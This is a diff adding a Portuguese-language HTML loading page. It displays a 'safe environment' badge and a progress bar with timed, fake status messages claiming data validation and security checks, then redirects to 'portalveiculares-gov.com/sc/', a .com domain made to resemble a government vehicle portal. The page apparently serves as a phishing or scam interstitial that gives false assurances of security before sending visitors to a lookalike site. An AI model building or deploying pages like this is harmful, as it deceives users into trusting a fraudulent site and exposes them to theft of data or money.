@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aguarde...</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:Arial, Helvetica, sans-serif;
+  background:#d9dde3;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
+
+/* CARD */
+.loading-card{
+  width:380px;
+  background:#fff;
+  border-radius:16px;
+  padding:35px 28px;
+  text-align:center;
+  box-shadow:0 10px 25px rgba(0,0,0,0.08);
+  animation:fadeIn .4s ease;
+  position:relative;
+  z-index:1;
+}
+
+/* SELO */
+.security-badge{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  font-size:12px;
+  font-weight:600;
+  color:#166534;
+  background:#dcfce7;
+  padding:8px 12px;
+  border-radius:999px;
+  width:fit-content;
+  margin:0 auto 18px;
+}
+
+.security-badge svg{
+  width:16px;
+  height:16px;
+}
+
+/* LOADER */
+.loader{
+  width:75px;
+  height:75px;
+  border:5px solid #dbeafe;
+  border-top:5px solid #2563eb;
+  border-radius:50%;
+  margin:0 auto 22px;
+  animation:spin 1s linear infinite;
+}
+
+/* TITULO */
+.title{
+  font-size:24px;
+  font-weight:700;
+  color:#0f172a;
+  margin-bottom:12px;
+}
+
+/* TEXTO */
+.text{
+  font-size:14px;
+  color:#64748b;
+  line-height:1.6;
+  margin-bottom:22px;
+}
+
+/* STATUS */
+.status{
+  background:#f1f5f9;
+  border-radius:10px;
+  padding:14px;
+  font-size:14px;
+  color:#334155;
+  margin-bottom:18px;
+}
+
+/* PROGRESS */
+.progress-container{
+  width:100%;
+  height:10px;
+  background:#e2e8f0;
+  border-radius:30px;
+  overflow:hidden;
+  margin-bottom:12px;
+}
+
+.progress-bar{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg,#2563eb,#3b82f6);
+  border-radius:30px;
+  transition:width .3s;
+}
+
+/* PERCENT */
+.percent{
+  font-size:14px;
+  color:#475569;
+  font-weight:600;
+}
+
+/* MODAL OVERLAY */
+.overlay{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.55);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:10;
+}
+
+/* MODAL */
+.modal{
+  width:320px;
+  background:#fff;
+  border-radius:14px;
+  padding:25px 20px;
+  text-align:center;
+  animation:pop .25s ease;
+}
+
+.modal h2{
+  font-size:18px;
+  margin-bottom:10px;
+  color:#0f172a;
+}
+
+.modal p{
+  font-size:14px;
+  color:#475569;
+  line-height:1.5;
+}
+
+/* ANIMAÇÕES */
+@keyframes spin{
+  from{transform:rotate(0deg);}
+  to{transform:rotate(360deg);}
+}
+
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(15px);}
+  to{opacity:1;transform:translateY(0);}
+}
+
+@keyframes pop{
+  from{transform:scale(0.9);opacity:0;}
+  to{transform:scale(1);opacity:1;}
+}
+</style>
+</head>
+
+<body>
+
+<div class="loading-card">
+
+  <div class="security-badge">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M12 2l7 4v6c0 5-3 9-7 10-4-1-7-5-7-10V6l7-4z"/>
+      <path d="M9 12l2 2 4-4"/>
+    </svg>
+    Ambiente seguro
+  </div>
+
+  <div class="loader"></div>
+
+  <div class="title">Aguarde um momento</div>
+
+  <div class="text">
+    Estamos processando sua solicitação com segurança.
+  </div>
+
+  <div class="status" id="statusText">
+    Iniciando processo...
+  </div>
+
+  <div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
+  <div class="percent" id="percentText">0%</div>
+
+</div>
+
+<!-- MODAL -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <h2>Redirecionando...</h2>
+    <p>
+      Você será direcionado para o serviço desejado em instantes.
+      Aguarde um momento.
+    </p>
+  </div>
+</div>
+
+<script>
+
+const progressBar = document.getElementById("progressBar");
+const percentText = document.getElementById("percentText");
+const statusText = document.getElementById("statusText");
+const overlay = document.getElementById("overlay");
+
+let progress = 0;
+
+const messages = [
+  "Iniciando processo...",
+  "Validando dados...",
+  "Aplicando segurança...",
+  "Finalizando...",
+  "Concluído com sucesso ✔"
+];
+
+const interval = setInterval(() => {
+
+  progress++;
+
+  progressBar.style.width = progress + "%";
+  percentText.innerText = progress + "%";
+
+  if(progress === 20) statusText.innerText = messages[1];
+  if(progress === 45) statusText.innerText = messages[2];
+  if(progress === 70) statusText.innerText = messages[3];
+
+  if(progress === 100){
+
+    clearInterval(interval);
+    statusText.innerText = messages[4];
+
+    setTimeout(() => {
+
+      overlay.style.display = "flex";
+
+      setTimeout(() => {
+        window.location.href = "https://portalveiculares-gov.com/sc/";
+      }, 2000);
+
+    }, 600);
+
+  }
+
+}, 60);
+
+</script>
+
+</body>
+</html>
